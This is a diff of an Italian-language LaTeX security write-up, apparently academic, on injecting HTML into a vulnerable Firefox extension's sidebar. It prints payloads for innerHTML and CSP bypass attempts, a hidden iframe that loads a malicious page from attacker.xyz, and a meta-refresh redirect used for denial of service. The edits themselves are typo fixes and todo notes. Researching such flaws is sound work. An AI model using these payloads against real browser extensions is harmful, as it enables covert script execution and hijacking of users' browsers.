@@ -1045,7 +1045,7 @@ window.onload = () => {
         controllo dell'evento è puramente a scopo dimostrativo e non ne influenza la cattura da parte
         del content-script.
         La figura \ref{fig:sidebar-key-value-example} mostra un esempio di funzionamento dell'estensione,
-        il riquadro sulla destra mostra la pagina dell'attaccante mentr il riquadro sulla sinistra visualizza 
+        il riquadro sulla destra mostra la pagina dell'attaccante mentre il riquadro sulla sinistra visualizza 
         la finestra della sidebar nella quale si distinguono
         i dati ottenuti dalla pagina dell'attaccante dove \textit{chiave:valore} proviene dagli
         elementi \code{<span>} e \textit{ev\_chiave:ev\_valore} dal contenuto dell'evento.
@@ -1066,28 +1066,28 @@ window.onload = () => {
     <script src="sbMain.js" type="text/javascript">
     <object data="javascript:location.href='about:blank'">
     <img src="https://wallpapercave.com/wp/wp5357862.jpg" onload="location.href='about:blank'" >
-        \end{lstlisting},
+\end{lstlisting}
         tutti hanno cercato di eseguire codice javascript e tutti hanno fallito, cerchiamo di capire
         le motivazioni dietro questo risultato.
 
         \subsubsection{Primo payload}
             \begin{lstlisting}
                 <script src="sbMain.js" type="text/javascript">
-            \end{lstlisting}
+\end{lstlisting}
             Il primo è un semplice tag script che esegue codice ottenuto dal file locale \file{sbMain.js},
-            gli obbiettivi di questo paylod sono due: scoprire se lo script venga incluso e scoprire che 
+            gli obiettivi di questo paylod sono due: scoprire se lo script venga incluso e scoprire che 
             cosa sia considerato "locale" nel contesto della sidebar. Il risultato atteso era un errore
             di Content Security Policy che bloccasse l'esecuzione dello script a fronte dell'inclusione del
             tag nello schema html; il tag è stato inserito ma nessun errore è apparso sulla console e non
             c'è stata alcuna esecuzione del codice \JS.\\
             La ragione sta proprio nell'utilizzo del setter \attr{innerHTML}, come specificato nella
             documentazione i tag \code{<script>} inseriti con questo metodo non saranno eseguiti per
-            ragioni di sicurezza \cite{innerHTML}; torneremo su questo punto nella \refSection{sec:attaccando-vuln-iframe-inclusion}.
+            ragioni di sicurezza \cite{innerHTML}; torneremo su questo punto nella \refSection{sec:attaccando-vuln-iframe-inclusion}\todo{fix}.
 
         \subsubsection{Secondo payload}
             \begin{lstlisting}
     <object data="javascript:location.href='about:blank'">
-            \end{lstlisting}
+\end{lstlisting}
             Questo payload è un classico bypass della restrizione di sicurezza su \attr{innerHTML} che ha impedito al
             payload precedente di essere eseguito, si tratta di un tag \code{<object>} che contiene una risorsa
             ottenuta dall'URL specificato nel campo \code{data}. Come il lettore avrà notato l'URL del payload
@@ -1104,19 +1104,19 @@ window.onload = () => {
         \subsubsection{Terzo payload}
             \begin{lstlisting}
     <img src="https://wallpapercave.com/wp/wp5357862.jpg" onload="location.href='about:blank'" >
-            \end{lstlisting}
+\end{lstlisting}
             L'ultimo payload tenta di ottenere una risorsa immagine da un URL terzo e redirigere la pagina
             quando l'elemento è stato caricato. L'attributo \code{onload} specifica il codice javascript
             da eseguire, gia discusso nella sezione precedente. Poiché la CSP delle estensioni restringe 
             solo l'origine degli script mi aspetto che l'immagine venga visualizzata nella sidebar ma il
             codice non sia eseguito. L'iniezione del tag conferma entrambe le ipotesi dimostrando che
-            è effettuare richieste a qualsiasi url, mentre il contenuto di \code{onload} viene segnalato
+            è \todo{possible?}effettuare richieste a qualsiasi url, mentre il contenuto di \code{onload} viene segnalato
             come script-inline e bloccato.\\
 
     \section{Bypass delle restrizoni}
     \label{sec:attaccando-vuln-bypass}
         I test precedenti hanno evidenziato le due maggiori difficoltà dietro l'iniezione di script,
-        \attr{innerHTML} impedisce l'uso di tag \script approcci volti all'inclusione si script locali
+        \attr{innerHTML} impedisce l'uso di tag \script{} \todo{fix italiano} approcci volti all'inclusione si script locali
         e la CSP della pagina nullifica le tecniche comuni di bypass di questo problema. Nelle sezioni
         che seguono discuto dei tentativi di mitigazione delle restrizioni e di quali impedimenti ho
         incontrato lungo il percorso.
@@ -1133,22 +1133,22 @@ window.onload = () => {
             uso dell'attributo \code{http-equiv}.\\
             Sempre la documentazione mozilla afferma: \textit{"Se l'attributo \code{http-equiv} è impostato,
             l'elemento \meta è una direttiva pragma fornente informazioni equivalenti a quelle che
-            verrebbero date da un header HTTP dotato di un nome simile "} \cite{tag-meta}. La Content
+            verrebbero date da un header HTTP dotato di un nome simile"} \cite{tag-meta}. La Content
             Security Policy di una risorsa web viene solitamente specificata da un header HTTP della
             risposta oppure dal tag \meta impostando \code{"content-security-policy"} come valore
             dell'attributo \code{http-equiv} e la politica desiderata come valore dell'attributo \code{content},
             così:
             \begin{lstlisting}[label=code:meta-tag-example]
 <meta http-equiv="Content-Security-Policy" content="script-src unsafe-inline" />
-            \end{lstlisting}
-            Il codice \ref{code:meta-tag-example} indica al browser che la Content Security Policy della
+\end{lstlisting}
+            Il codice \ref{code:meta-tag-example}\todo{Non si capisce quale e'} indica al browser che la Content Security Policy della
             pagina autorizza l'esecuzione di script-inline come quelli bloccati nei miei primi tentativi.\\
             A fronte di queste informazioni ho costruito un nuovo payload che sovrascrivesse la CSP della
             pagina ed eseguisse \JS inline, il listato sottostante mostra tale codice:
             \begin{lstlisting}
     <meta http-equiv="Content-Security-Policy" content="script-src unsafe-inline" />
     <object data="javascript:location.href='about:blank'">
-            \end{lstlisting}
+\end{lstlisting}
             Purtroppo neanche questo test ha avuto successo, la console mi ha restituito un errore di Content
             Security Policy affermando che lo script-inline violasse la CSP della pagina. La causa
             di questo fallimento è dovuta ad un'altra misura di sicurezza specifica delle WebExtension: la CSP
@@ -1178,7 +1178,7 @@ window.onload = () => {
 
             \begin{lstlisting}[caption={iframe costruito con srcdoc},label={code:sidebar-iframe-example}]
 <iframe srcdoc="<html><body><script src=http://localhost/code.js ><\/script></body></html>">
-            \end{lstlisting}
+\end{lstlisting}
 
             \begin{figure}[ht]
                 \centering
@@ -1189,7 +1189,7 @@ window.onload = () => {
 
             Da questo test si estrapolano tre punti importanti:
             \begin{enumerate}
-                \item Seppure dal punto di vista dell'\iframe la propria origine sia \code{about:srcdoc}, è comunque
+                \item Seppure dal punto di vista dell'\iframe{} la propria origine sia \code{about:srcdoc}, è comunque
                         considerato same-origin dal genitore ed ha accesso al WebExtensionAPI
 
                 \item L'URI di una estensione è un uuid prefisso dal protocollo \code{moz-extension://}, potenzialmente
@@ -1207,7 +1207,7 @@ window.onload = () => {
         funzionamento dell'estensione combinandone sapientemente le caratteristiche con i risultati
         ottenuti in precedenza. Come verrà discusso nelle sezioni seguenti, il livello di danno provocato da queste 
         tecniche dipende molto dalle funzionalità e dai file accessibili all'estensione. Sotto questa luce 
-        quello di \vuln è un ambiente piuttosto magro che non rende onore ai risultati ottenibili con estensioni più 
+        quello di \vuln{} è un ambiente piuttosto magro che non rende onore ai risultati ottenibili con estensioni più 
         complesse eppure sufficiente ai fini dimostrativi dell'articolo.
 
         \subsection{Script persistente}
@@ -1223,12 +1223,12 @@ window.onload = () => {
             una estensione vulnerabile che visualizzi di frequente dati immagazzinati in uno storage 
             persistente fornirebbe agli sviluppatori di malware un modo piu silenzioso e robusto di
             archiviare link ai propri script.\\
-            Il \refCode{code:iframe-nascosto} mostra il codice html per iniettare un \iframe invisibile
+            Il \refCode{code:iframe-nascosto} mostra il codice html per iniettare un \iframe{} invisibile
             all'utente contenente una pagina che immaginiamo svolga un qualche task malevolo a lungo termine.
 
             \begin{lstlisting}[label=code:iframe-nascosto]
     <iframe src=http://www.attacker.xyz/task.html style="position: absolute; width:0; height:0; border:0;" >
-            \end{lstlisting}
+\end{lstlisting}
 
             Dopo essere stato inviato allo script in background, il payload viene salvato nella storage ed
             iniettato in modo automatico nella finestra della sidebar ad ogni apertura. Nell'ipotesi che
@@ -1236,7 +1236,7 @@ window.onload = () => {
             avrà la quasi certezza che il task malevolo verrà eseguito con frequenza.
 
         \subsection{Redirect della pagina}
-            Seppure il tag \meta possa sovrascrivere la CSP della pagina, nella \refSection{sec:attaccando-vuln-bypass-meta}
+            Seppure il tag \meta{} possa sovrascrivere la CSP della pagina, nella \refSection{sec:attaccando-vuln-bypass-meta}
             sono state discusse le ragioni per cui non sia possibile nel contesto delle estensioni, ma
             nonostante cio il tag \meta mi ha permesso di ottenere un attacco di Denial Of Service sulla finestra 
             della sidebar. Oltre alla chiave \code{"content-security-policy"}
@@ -1244,8 +1244,8 @@ window.onload = () => {
             \code{"refresh"} impone alla pagina di essere ricaricata o reindirizzata su un'altro dominio dopo
             un periodo di timeout arbitrario, la sintassi appare così:
             \begin{lstlisting}[label=code:sidebar-meta-refresh-example]
-                <meta http-equiv="refresh" content="1; http://www.attacker.xyz/" >
-            \end{lstlisting}
+<meta http-equiv="refresh" content="1; http://www.attacker.xyz/" >
+\end{lstlisting}
             La riga precedente si traduce come: "attendi 1 secondo, poi reindirizza la pagina sull'URL 
             \code{'http://www.attacker.xyz/'}".
             Usando questa direttiva è possibile reindirizzare qualsiasi finestra verso un URL arbitrario,
